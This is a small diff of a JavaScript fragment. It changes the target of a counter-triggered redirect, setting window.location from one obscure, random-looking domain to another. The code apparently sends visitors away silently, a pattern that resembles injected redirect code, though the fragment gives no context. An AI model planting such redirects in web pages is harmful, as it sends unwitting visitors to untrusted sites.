@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://hyeiyevverldd.top";
+		var url="https://www.mqylmlp.com";
 		window.location=url;
 	}
 }
@@ -13,6 +13,7 @@ function getLoad()
 	num++;
 
 }
+
 
 
 
